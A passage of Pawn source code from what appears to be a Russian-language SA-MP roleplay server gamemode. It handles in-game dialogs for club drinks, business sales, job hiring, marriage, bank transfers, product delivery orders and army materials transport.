					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
					ApplyAnimation(playerid,"BAR","dnk_stndF_loop",4.1,0,0,0,0,0,1);
					ClubList(playerid, i);
				}
			case 3:
				{
					if(GetMoney(playerid) < till*15) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*15);
					BizzInfo[i][bMoney] += till*15;
					BizzInfo[i][bProduct] -= 15;
					BizzPay[i] += till*15;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					SetHealth(playerid, health+20.0);
					format(string, 90, "%s выпил(а) пиво",PlayerInfo[playerid][pSendername]);
					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
					if(GetPlayerDrunkLevel(playerid) < 20000) SetPlayerDrunkLevel(playerid,GetPlayerDrunkLevel(playerid)+2000);
					ApplyAnimation(playerid,"BAR","dnk_stndF_loop",4.1,0,0,0,0,0,1);
					ClubList(playerid, i);
				}
			case 4:
				{
					if(GetMoney(playerid) < till*20) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*20);
					BizzInfo[i][bMoney] += till*20;
					BizzInfo[i][bProduct] -= 20;
					BizzPay[i] += till*20;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					SetHealth(playerid, health+30.0);
					format(string, 90, "%s выпил(а) водки",PlayerInfo[playerid][pSendername]);
					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
					if(GetPlayerDrunkLevel(playerid) < 20000) SetPlayerDrunkLevel(playerid,GetPlayerDrunkLevel(playerid)+5000);
					ApplyAnimation(playerid,"BAR","dnk_stndF_loop",4.1,0,0,0,0,0,1);
					ClubList(playerid, i);
				}
			case 5:
				{
					if(GetMoney(playerid) < till*25) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*25);
					BizzInfo[i][bMoney] += till*25;
					BizzPay[i] += till*25;
					BizzInfo[i][bProduct] -= 25;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					SetHealth(playerid, health+30.0);
					format(string, 90, "%s выпил(а) коньяк",PlayerInfo[playerid][pSendername]);
					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
					if(GetPlayerDrunkLevel(playerid) < 20000) SetPlayerDrunkLevel(playerid,GetPlayerDrunkLevel(playerid)+5000);
					ApplyAnimation(playerid,"BAR","dnk_stndF_loop",4.1,0,0,0,0,0,1);
					ClubList(playerid, i);
				}
			case 6:
				{
					if(GetMoney(playerid) < till*30) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*30);
					BizzInfo[i][bMoney] += till*30;
					BizzPay[i] += till*30;
					BizzInfo[i][bProduct] -= 30;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					SetHealth(playerid, health+30.0);
					if(GetPlayerDrunkLevel(playerid) < 20000) SetPlayerDrunkLevel(playerid,GetPlayerDrunkLevel(playerid)+5000);
					format(string, 90, "%s выпил(а) абсент",PlayerInfo[playerid][pSendername]);
					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
					ApplyAnimation(playerid,"BAR","dnk_stndF_loop",4.1,0,0,0,0,0,1);
					ClubList(playerid, i);
				}
			}
			GetPlayerHealth(playerid,health);
			if(health > 100) SetHealth(playerid, 100.0);
			if(GetPlayerDrunkLevel(playerid) > 20000) SetPlayerDrunkLevel(playerid,20000);
		}
	case D_HEAL+16:
		{
			if(!response) return true;
			new i = GetPVarInt(playerid, "PlayerBizz");
			strmid(BizzInfo[i][bOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
			BizzInfo[i][bLock] = 0;
			SendMes(playerid, COLOR_LIGHTRED, "Вы продали свой бизнес за %i. Деньги с бизнеса переведены на ваш счет",BizzInfo[i][bMoney]);
			PlayerInfo[playerid][pBank] += BizzInfo[i][bMoney];
			format(query, 256, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
			BizzInfo[i][bBuyPrice] = 0;
			BizzInfo[i][bMoney] = 0;
			BizzInfo[i][bLic] = 0;
			BizzInfo[i][bEnter] = 100;
			BizzInfo[i][bTill] = 50;
			BizzInfo[i][bMafia] = 0;
			BizzInfo[i][bProduct] = 100000;
			format(totalstring, sizeof(totalstring), "UPDATE "TABLE_BIZZ" SET owner='%s', block=%d, money=%d, lic=%d, penter=%d, till=%d, buyprice=%d , product=%d WHERE id = %d",
			BizzInfo[i][bOwner], BizzInfo[i][bLock], BizzInfo[i][bMoney], BizzInfo[i][bLic], BizzInfo[i][bEnter], BizzInfo[i][bTill], BizzInfo[i][bBuyPrice],BizzInfo[i][bProduct],i);
			mysql_query(totalstring);
			UpdateBizz(i);
			GameTextForPlayer(playerid,  "The busines sold", 3000, 5);
		}
	case D_HEAL+17:
		{
			if(!response) return true;
			new text[30];
			switch(listitem)
			{
			case J_BUS-1:
				{
					if(PlayerInfo[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_GREY, "Работа доступну со 2-го уровня!");
					text = "Водитель автобуса";
				}
			case J_TAXI-1:
				{
					if(PlayerInfo[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_GREY, "Работа доступна со 2-го уровня!");
					text = "Водитель такси";
				}
			case J_PRODUCT-1:
				{
					if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Работа доступна с 3-го уровня!");
					text = "Развозчик продуктов";
				}
			case J_FUEL-1:
				{
					if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Работа доступна с 3-го уровня!");
					text = "Развозчик топлива";
				}
			case J_MECHANIC-1:
				{
					if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Работа доступна с 3-го уровня!");
					text = "Автомеханик";
				}
			case J_TRUCKER-1:
				{
					if(PlayerInfo[playerid][pLevel] < 6) return SendClientMessage(playerid, COLOR_GREY, "Работа доступна с 6-го уровня!");
					text = "Дальнобойщик";
				}
			}
			PlayerInfo[playerid][pJob] = listitem+1;
			SendMes(playerid, COLOR_BLUE, "Вас успешно приняли на работу: %s. Уволиться: /quitjob", text);
			SendClientMessage(playerid, COLOR_WHITE, "Новые доступные команды: /mm > Команды сервера > Работа");
		}
	case D_HEAL+19:
		{
			new playerd = GetPVarInt(playerid, "PlayerMarriage");
			if(response)
			{
				format(string, 90, "[ - - - - - - - Поздравляем %s & %s - - - - - - - ]", sendername(playerd), PlayerInfo[playerid][pSendername]);
				SendClientMessageToAll(COLOR_WHITE, string);
				SendClientMessageToAll(COLOR_WHITE, "Внимание! В штате появилась новая семейная пара!");
				PlayerInfo[playerd][pBank] -= 100000;
				Exchequer+=100000;
				format(query, 256, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
				strmid(PlayerInfo[playerid][pWhoMarried], sendername(playerd), 0, strlen(sendername(playerd)), MAX_PLAYER_NAME);
				strmid(PlayerInfo[playerd][pWhoMarried], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
				PlayerInfo[playerid][pMarried] = true;
				PlayerInfo[playerd][pMarried] = true;
				SendMes(playerid, COLOR_LIGHTBLUE, "Вы приняли предложение связать судьбу с %s", sendername(playerd));
				SendMes(playerd, COLOR_LIGHTBLUE, "%s принял(а) предложение связать судьбу с вами", PlayerInfo[playerid][pSendername]);
			}
			else SendMes(playerd, COLOR_LIGHTBLUE, "%s отклонил(а) предложение связать судьбу с вами", PlayerInfo[playerid][pSendername]);
			DeletePVar(playerid, "PlayerMarriage");
		}
	case D_HEAL+20:
		{
			new playerd = GetPVarInt(playerid, "PlayerMarriage");
			if(response)
			{
				strmid(PlayerInfo[playerid][pWhoMarried], "None", 0, strlen("None"), MAX_PLAYER_NAME);
				strmid(PlayerInfo[playerd][pWhoMarried], "None", 0, strlen("None"), MAX_PLAYER_NAME);
				PlayerInfo[playerid][pMarried] = false;
				PlayerInfo[playerd][pMarried] = false;
				SendMes(playerid, COLOR_LIGHTBLUE, "Вы приняли предложение развестись %s", sendername(playerd));
				SendMes(playerd, COLOR_LIGHTBLUE, "%s принял(а) предложение развестись с вами", PlayerInfo[playerid][pSendername]);
			}
			else SendMes(playerd, COLOR_LIGHTBLUE, "%s отклонил(а) предложение развестись с вами", PlayerInfo[playerid][pSendername]);
			DeletePVar(playerid, "PlayerMarriage");
		}
	case D_HEAL+21:
		{
			if(!response) return BankList(playerid);
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_HEAL+21, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад");
			if(price < 1) return ShowPlayerDialog(playerid, D_HEAL+21, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад");
			if(PlayerInfo[playerid][pBank] < price) { ShowPlayerDialog(playerid, D_HEAL+21, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank); }
			new i = GetPVarInt(playerid, "PlayerBizz");
			SetPVarInt(playerid, "PriceATM", 0);
			PlayerInfo[playerid][pBank] -= price;
			BizzInfo[i][bMoney] += price;
			SetBizzInt(i, "money", BizzInfo[i][bMoney]);
			SendMes(playerid, TEAM_BLUE_COLOR, "Вы положили на биз.счет: %i долларов. На биз.счете: %i долларов", price, BizzInfo[i][bMoney]);
			BankList(playerid);
		}
 	case D_HEAL+213:
		{
			if(!response) return BankList(playerid);
			new price;
			new i = GetPVarInt(playerid, "PlayerBizz");
			new money = BizzInfo[i][bMoney];
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_HEAL+213, 1, "Вывод", "Введите кол-во долларов:", "Принять", "Назад");
			if(price < 1) return ShowPlayerDialog(playerid, D_HEAL+213, 1, "Вывод", "Введите кол-во долларов:", "Принять", "Назад");
			if(money < price) { ShowPlayerDialog(playerid, D_HEAL+213, 1, "Вывод", "Введите кол-во долларов:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBizz); }
			SetPVarInt(playerid, "PriceATM", 0);
			BizzInfo[i][bMoney] -= price;
			GiveMoney(playerid, price);
			SetBizzInt(i, "money", BizzInfo[i][bMoney]);
			SendMes(playerid, TEAM_BLUE_COLOR, "Вы вывели с биз.счета: %i долларов. На биз.счете: %i долларов", price, BizzInfo[i][bMoney]);
			BankList(playerid);
		}
	case D_ATM+1:
		{
			if(!response) return BankList(playerid);
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_ATM+1, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад");
			if(price < 1) return ShowPlayerDialog(playerid, D_ATM+1, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад");
			if(GetMoney(playerid) < price) { ShowPlayerDialog(playerid, D_ATM+1, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney); }
			SetPVarInt(playerid, "PriceATM", 0);
			PlayerInfo[playerid][pPhoneBalance] += price;
			GiveMoney(playerid, -price);
			SendMes(playerid, COLOR_GREEN, "Вы положили на счет телефона: %i долларов.", price);
			BankList(playerid);
			return true;
		}
	case D_HEAL+22:
		{
			if(!response) { DeletePVar(playerid, "ProductID"); return ProductList(playerid); }
			if(strcmp(ProductInfo[GetPVarInt(playerid, "ProductID")][pName], PlayerInfo[playerid][pSendername], true) == 0) { DeletePVar(playerid, "ProductID"); ProductList(playerid); return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь выполнить свой заказ!"); }
			if(ProductInfo[GetPVarInt(playerid, "ProductID")][pStatus] == true) { SendClientMessage(playerid, COLOR_GREY, "Заказ уже выполняется кем-либо!"); DeletePVar(playerid, "ProductID"); return ProductList(playerid); }
			new Float:VPos[3], i = ProductInfo[GetPVarInt(playerid, "ProductID")][pBizzid];
			SendMes(playerid, TEAM_BLUE_COLOR, "Вы приняли заказ от %s. Чтобы отменить, введите: /cancel", ProductInfo[GetPVarInt(playerid, "ProductID")][pName]);
			GetPlayerPos(playerid, VPos[0], VPos[1], VPos[2]);
			DisablePlayerRaceCheckpoint(playerid);
			ProductInfo[GetPVarInt(playerid, "ProductID")][pStatus] = true;
			SetPlayerRaceCheckpoint(playerid, 1, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz], 0.0,0.0,0.0,6);
			SendMes(playerid, COLOR_YELLOW, "На карте отмечен: %s. Расстояние: %.1f метров",BizzInfo[i][bName],GetDistanceBetweenPoints(VPos[0], VPos[1], VPos[2], BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]));
			format(string, 50, "{9ACD32}Продуктов: {ffffff}%i", ProductInfo[GetPVarInt(playerid, "ProductID")][pTill]);
			ProductInfo[GetPVarInt(playerid, "ProductID")][pText3D] = Create3DTextLabel(string, 0xffffffff, 0.0, 0.0, 0.0, 30.0, 0, 1);
			Attach3DTextLabelToVehicle(ProductInfo[GetPVarInt(playerid, "ProductID")][pText3D], GetPlayerVehicleID(playerid), 0, -1.0, 0.5);
		}
	case D_HEAL+23:
		{
			if(!response) return true;
			SetPVarInt(playerid, "ProductID", listitem+1);
			format(string, 256, "{ffffff}Номер заказа {8D8DFF}\t\t№%i %s\n\n{ffffff}Заказал:\t\t{8D8DFF}%s\n{ffffff}Куда:\t\t\t{8D8DFF}%s\n{ffffff}Количество:\t\t{8D8DFF}%i {ffffff}продуктов\n{ffffff}Оплата:\t\t{8D8DFF}2000{ffffff} долларов",
			listitem+1, (!ProductInfo[listitem+1][pStatus]) ? ("{8D8DFF}(Доступен)") : ("{FF6347}(Выполняется)"), ProductInfo[listitem+1][pName], BizzInfo[ProductInfo[listitem+1][pBizzid]][bName],ProductInfo[listitem+1][pTill]);
			ShowPlayerDialog(playerid, D_HEAL+22, 0, "Заказ", string, "Принять", "Назад");
		}
	case D_HEAL+24:
		{
			
			if(!response) return true;
			new till = strval(inputtext);
			new i = GetPVarInt(playerid, "PlayerBizz");
			SendMes(playerid, TEAM_BLUE_COLOR,"ПРОДУКТОВ: %i", till);
			if(till < 1000 || till > 20000-BizzInfo[i][bProduct])
			{
				SendClientMessage(playerid, COLOR_GREY, "Кол-во продуктов от 1000 до 10000!");
				return ShowPlayerDialog(playerid, D_HEAL+24, 1, "Продукты", "{ffffff}Введите кол-во продуктов и оплату (через запятую):\n\nНа {8D8DFF}50{ffffff} единиц продукции приходиться {8D8DFF}50 {ffffff}долларов\n\n", "Принять", "Отмена");
			}
			if(PlayerInfo[playerid][pBank] < till*26) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank);
			TOTALPRODUCT++;
			strmid(ProductInfo[TOTALPRODUCT][pName],PlayerInfo[playerid][pSendername],0,strlen(PlayerInfo[playerid][pSendername]),MAX_PLAYER_NAME);
			ProductInfo[TOTALPRODUCT][pPrice] = till*26;
			ProductInfo[TOTALPRODUCT][pTill] = till;
			ProductInfo[TOTALPRODUCT][pBizzid] = i;
			ProductInfo[TOTALPRODUCT][pStatus] = false;
			PlayerInfo[playerid][pBank] -= ProductInfo[TOTALPRODUCT][pPrice];
			SendMes(playerid, TEAM_BLUE_COLOR, "Вы заказали %i продуктов, Снято с кредитки: %i долларов.", till, ProductInfo[TOTALPRODUCT][pPrice]);
			for(new p = 0; p < MAX_PLAYERS; p++)
			{
				if(!IsPlayerConnected(p) || PlayerLogged[p] == 0 || PlayerInfo[p][pJob] != J_PRODUCT) continue;
				SendMes(p,  COLOR_ALLDEPT, "Поступил новый заказ от %s. Используйте: /plist", PlayerInfo[playerid][pSendername]);
			}
		}
	case D_HEAL+25:
		{
			if(!response) { RemoveFromVehicle(playerid); return true; }
		//	new vehicleid = GetPlayerVehicleID(playerid);
		//	format(string, 50, "Материалы: {DB840A}%i / 5000{ffffff} кг", Jelez[vehicleid]);
		//	VehJZ[vehicleid] = Create3DTextLabel(string, 0xffffffff, 0.0, 0.0, 0.0, 30.0, 0, 1);
		//	Attach3DTextLabelToVehicle(VehJZ[vehicleid], vehicleid, 0, -1.0, 0.5);
			SendMes(playerid, COLOR_WHITE, "Отправляйтесь на точку каторая помечена у вас на радаре");
			Mission[playerid] = 1;
			SetPlayerCheckpoint(playerid,2524.0149,2819.1299,10.8203,10.0);
			return true;
		}
	case D_HEAL+26:
		{
			if(!response) return true;
			new idx = GetPVarInt(playerid, "PlayerBizz");
			if(GetMoney(playerid) < BizzInfo[idx][bEnter]) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
			GiveMoney(playerid, -BizzInfo[idx][bEnter]);
			BizzInfo[idx][bMoney] += BizzInfo[idx][bEnter];
			BizzPay[idx] += BizzInfo[idx][bEnter];
			SetBizzInt(idx, "money", BizzInfo[idx][bMoney]);
			SetPlayerPos(playerid,BizzInfo[idx][bExitx], BizzInfo[idx][bExity], BizzInfo[idx][bExitz]);
			SetPlayerInterior(playerid,BizzInfo[idx][bInt]);
			SetPlayerVirtualWorld(playerid,BizzInfo[idx][bVirtual]);
			return true;
		}
	case D_JOB+2:
		{
			if(!response) return true;
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем транспорта!");
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 433) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в матовозе!");
			switch(listitem)
			{
			case 0:
				{
					if(Mats[0] == 0) return SendClientMessage(playerid, COLOR_GREY, "На складе нет материалов!");
					if(materials_Vehicle[GetPlayerVehicleID(playerid)] > 0) return SendClientMessage(playerid, COLOR_GREY, "Сначала выгрузите оружие из матовоза!");
					ShowPlayerDialog(playerid, D_JOB+9, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
				}
			case 1:
				{
					if(PlayerInfo[playerid][pMember] != F_ARMY) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
					if(materials_Status[playerid] > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже загрузили матовоз и куда-то направляетесь!");
					if(Mats[0] == 0) return SendClientMessage(playerid, COLOR_GREY, "На складе нет материалов!");
					if(materials_Vehicle[GetPlayerVehicleID(playerid)] > 0) return SendClientMessage(playerid, COLOR_GREY, "Сначала выгрузите оружие из матовоза!");
					ShowPlayerDialog(playerid, D_JOB+3, 1, "ЛСПД", "Введите кол-во материалов:", "Принять", "Отмена");
				}
			case 2:
				{
					if(PlayerInfo[playerid][pMember] != F_ARMY) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
					if(materials_Status[playerid] > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже загрузили матовоз и куда-то направляетесь!");
					if(Mats[0] == 0) return SendClientMessage(playerid, COLOR_GREY, "На складе нет материалов!");
					if(materials_Vehicle[GetPlayerVehicleID(playerid)] > 0) return SendClientMessage(playerid, COLOR_GREY, "Сначала выгрузите оружие из матовоза!");
					ShowPlayerDialog(playerid, D_JOB+4, 1, "СФПД", "Введите кол-во материалов:", "Принять", "Отмена");
				}
			case 3:
				{
					if(PlayerInfo[playerid][pMember] != F_ARMY) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
					if(materials_Status[playerid] > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже загрузили матовоз и куда-то направляетесь!");
					if(Mats[0] == 0) return SendClientMessage(playerid, COLOR_GREY, "На складе нет материалов!");
					if(materials_Vehicle[GetPlayerVehicleID(playerid)] > 0) return SendClientMessage(playerid, COLOR_GREY, "Сначала выгрузите оружие из матовоза!");
					ShowPlayerDialog(playerid, D_JOB+5, 1, "ФБР", "Введите кол-во материалов:", "Принять", "Отмена");
				}
			case 4:
				{
					if(materials_Vehicle[GetPlayerVehicleID(playerid)] == 0) return SendClientMessage(playerid, COLOR_GREY, "В матовозе нет материалов!");
					Mats[0] += materials_Vehicle[GetPlayerVehicleID(playerid)];
					SetOtherInt("armymats", Mats[0]);
					SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из матовоза {ffffff}%i {FF6347}материалов. На складе: {ffffff}%i {FF6347}материалов",materials_Vehicle[GetPlayerVehicleID(playerid)],Mats[0]);
					materials_Vehicle[GetPlayerVehicleID(playerid)] = 0;
					Delete3DTextLabel(materials_Label[playerid]);
					materials_Status[playerid] = 0;
					format(string, 50, "материалов: {9ACD32}%i / 10000", Mats[0]);
					Update3DTextLabelText(tPickup[5], 0xFFFFFFFF, string);
					Update3DTextLabelText(tPickup[12], 0xFFFFFFFF, string);
					return true;
				}
			}
		}
	case D_JOB+3:
		{
			if(!response) return true;
			new till = 0, Float:VPos[3];
			if(sscanf(inputtext, "i",till)) return ShowPlayerDialog(playerid, D_JOB+3, 1, "ЛСПД", "Введите кол-во материалов:", "Принять", "Отмена");
			if(till < 1 || till > 10000)
			{
				SendMes(playerid, COLOR_GREY, "Кол-во материалов от 1 до 10000!");
				return ShowPlayerDialog(playerid, D_JOB+3, 1, "ЛСПД", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			if(till > Mats[0])
			{
				SendClientMessage(playerid, COLOR_GREY, "На складе недостаточно материалов!");
				return ShowPlayerDialog(playerid, D_JOB+3, 1, "ЛСПД", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			GetPlayerPos(playerid, VPos[0], VPos[1], VPos[2]);
			Mats[0] -= till;
			format(string, 50, "материалов: {9ACD32}%i / 10000", Mats[0]);
			Update3DTextLabelText(tPickup[5], 0xFFFFFFFF, string);
			Update3DTextLabelText(tPickup[12], 0xFFFFFFFF, string);
			SetOtherInt("armymats", Mats[0]);
			SendMes(playerid, COLOR_LIGHTGREEN, "Вы загрузили {ffffff}%i {9ACD32}материалов. Остаток на складе: {ffffff}%i {9ACD32}материалов",till,Mats[0]);
			materials_Vehicle[GetPlayerVehicleID(playerid)] += till;
			materials_Status[playerid] = 1;
			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid, 1, 1528.7881,-1677.7826,5.8906, 0.0,0.0,0.0,6);
			SendMes(playerid, COLOR_LIGHTGREEN, "На карте отмечено: ЛСПД. Расстояние: %.1f метров",GetDistanceBetweenPoints(VPos[0], VPos[1], VPos[2],1528.7881,-1677.7826,5.8906));
			format(string, 50, "{9ACD32}материалов: {ffffff}%i / 10000", materials_Vehicle[GetPlayerVehicleID(playerid)]);
			materials_Label[playerid] = Create3DTextLabel(string, 0xFFFFFFFF, 0.0, 0.0, 0.0, 30.0, 0, 1);
			Attach3DTextLabelToVehicle(materials_Label[playerid], GetPlayerVehicleID(playerid), 0, -2.0, 0.5);
			return true;
		}
	case D_JOB+4:
		{
			if(!response) return true;
			new till = 0, Float:VPos[3];
			if(sscanf(inputtext, "i",till)) return ShowPlayerDialog(playerid, D_JOB+4, 1, "СФПД", "Введите кол-во материалов:", "Принять", "Отмена");
			if(till < 1 || till > 10000)
			{
				SendMes(playerid, COLOR_GREY, "Кол-во материалов от 1 до 10000!");
				return ShowPlayerDialog(playerid, D_JOB+4, 1, "СФПД", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			if(till > Mats[0])
			{
				SendClientMessage(playerid, COLOR_GREY, "На складе недостаточно материалов!");
				return ShowPlayerDialog(playerid, D_JOB+4, 1, "СФПД", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			GetPlayerPos(playerid, VPos[0], VPos[1], VPos[2]);
			Mats[0] -= till;
			format(string, 50, "материалов: {9ACD32}%i / 10000", Mats[0]);
			Update3DTextLabelText(tPickup[5], 0xFFFFFFFF, string);
			Update3DTextLabelText(tPickup[12], 0xFFFFFFFF, string);
			SetOtherInt("armymats", Mats[0]);
			SendMes(playerid, COLOR_LIGHTGREEN, "Вы загрузили {ffffff}%i {9ACD32}материалов. Остаток на складе: {ffffff}%i {9ACD32}материалов",till,Mats[0]);
			materials_Vehicle[GetPlayerVehicleID(playerid)] += till;
			materials_Status[playerid] = 2;
			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid, 1, -1606.3987,676.3289,-5.2422, 0.0,0.0,0.0,6);
			format(string, 50, "{9ACD32}материалов: {ffffff}%i / 10000", materials_Vehicle[GetPlayerVehicleID(playerid)]);
			materials_Label[playerid] = Create3DTextLabel(string, 0xFFFFFFFF, 0.0, 0.0, 0.0, 30.0, 0, 1);
			materials_Label[playerid] = Create3DTextLabel(string, COLOR_WHITE, 0.0, 0.0, 0.0, 30.0, 0, 1);
			Attach3DTextLabelToVehicle(materials_Label[playerid], GetPlayerVehicleID(playerid), 0, -2.0, 0.5);
			return true;
		}
	case D_JOB+5:
		{
			if(!response) return true;
			new till = 0, Float:VPos[3];
			if(sscanf(inputtext, "i",till)) return ShowPlayerDialog(playerid, D_JOB+5, 1, "ФБР", "Введите кол-во материалов:", "Принять", "Отмена");
			if(till < 1 || till > 10000)
			{
				SendMes(playerid, COLOR_GREY, "Кол-во материалов от 1 до 10000!");
				return ShowPlayerDialog(playerid, D_JOB+5, 1, "ФБР", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			if(till > Mats[0])
			{
				SendClientMessage(playerid, COLOR_GREY, "На складе недостаточно материалов!");
				return ShowPlayerDialog(playerid, D_JOB+5, 1, "ФБР", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			GetPlayerPos(playerid, VPos[0], VPos[1], VPos[2]);
			Mats[0] -= till;
			format(string, 50, "материалов: {9ACD32}%i / 10000", Mats[0]);
			Update3DTextLabelText(tPickup[5], 0xFFFFFFFF, string);
			Update3DTextLabelText(tPickup[12], 0xFFFFFFFF, string);
			SetOtherInt("armymats", Mats[0]);
			SendMes(playerid, COLOR_LIGHTGREEN, "Вы загрузили {ffffff}%i {9ACD32}материалов. Остаток на складе: {ffffff}%i {9ACD32}материалов",till,Mats[0]);
			materials_Vehicle[GetPlayerVehicleID(playerid)] += till;
			materials_Status[playerid] = 3;
			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid, 1, 2292.7478,2468.5667,10.8203, 0.0,0.0,0.0,6);
			SendMes(playerid, COLOR_LIGHTGREEN, "На карте отмечено: ФБР. Расстояние: %.1f метров",GetDistanceBetweenPoints(VPos[0], VPos[1], VPos[2],2292.7478,2468.5667,10.8203));
			format(string, 50, "{9ACD32}материалов: {ffffff}%i / 10000", materials_Vehicle[GetPlayerVehicleID(playerid)]);
			materials_Label[playerid] = Create3DTextLabel(string, 0xFFFFFFFF, 0.0, 0.0, 0.0, 30.0, 0, 1);
			Attach3DTextLabelToVehicle(materials_Label[playerid], GetPlayerVehicleID(playerid), 0, -2.0, 0.5);
			return true;
		}
	case D_JOB+7:
		{
			new playerd = GetPVarInt(playerid, "PlayerGun"), weapon = GetPVarInt(playerid, "PlayerGun_"), price = GetPVarInt(playerid, "PlayerGPrice"), ammo = GetPVarInt(playerid, "PlayerGAmmo");
			if(response)
			{
				if(PlayerInfo[playerid][pLevel] <= 1) return SendMes(playerid,COLOR_YELLOW,"Продавать оружие игрокам 1 уровня запрещено!");
				if(GetMoney(playerid) < price)
				{
					SendMes(playerd,0x6495EDFF, "У игрока %s недостаточно средств", PlayerInfo[playerid][pSendername]);
					DeletePVar(playerid, "PlayerGun");
					DeletePVar(playerid, "PlayerGun_");
					DeletePVar(playerid, "PlayerGAmmo");
					DeletePVar(playerid, "PlayerGPrice");
					return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств");
				}
				GiveMoney(playerid, -price);
				GiveMoney(playerd, price);
				PlayerInfo[playerd][pMats] -=ammo;
				GiveWeapon(playerid, weapon, ammo);
				SendMes(playerd, COLOR_BLUE, "Вы продали оружие %s'у за %i долларов. Осталось материалов: %i", PlayerInfo[playerid][pSendername], price, PlayerInfo[playerd][pMats]);
				SendMes(playerid, COLOR_BLUE, "Вы купили оружие у %s c %i патронами. Цена: %i", sendername(playerd), ammo, price);
				format(string, 100, "%s сделал оружие и передал в руки %s",sendername(playerd), PlayerInfo[playerid][pSendername]);
				ProxDetectorNew(playerd, 30.0, COLOR_PURPLE, string);
			}
			else SendMes(playerd, COLOR_BLUE, "%s отклонил предложение купить у вас оружие", PlayerInfo[playerid][pSendername]);
			DeletePVar(playerid, "PlayerGun");
			DeletePVar(playerid, "PlayerGun_");
			DeletePVar(playerid, "PlayerGAmmo");
			DeletePVar(playerid, "PlayerGPrice");
			return true;
		}
	case D_JOB+9:
		{
			if(!response) return true;
			new till = 0;
			if(sscanf(inputtext, "i",till)) return ShowPlayerDialog(playerid, D_JOB+9, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			if(till < 1 || till > 10000)
			{
				SendMes(playerid, COLOR_GREY, "Кол-во материалов от 1 до 10000!");
				return ShowPlayerDialog(playerid, D_JOB+9, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			if(till > Mats[0])
			{
				SendClientMessage(playerid, COLOR_GREY, "На складе недостаточно материалов!");
				return ShowPlayerDialog(playerid, D_JOB+9, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			Mats[0] -= till;
			format(string, 50, "материалов: {9ACD32}%i / 10000", Mats[0]);
			Update3DTextLabelText(tPickup[5], 0xFFFFFFFF, string);
			Update3DTextLabelText(tPickup[12], 0xFFFFFFFF, string);
			SetOtherInt("armymats", Mats[0]);
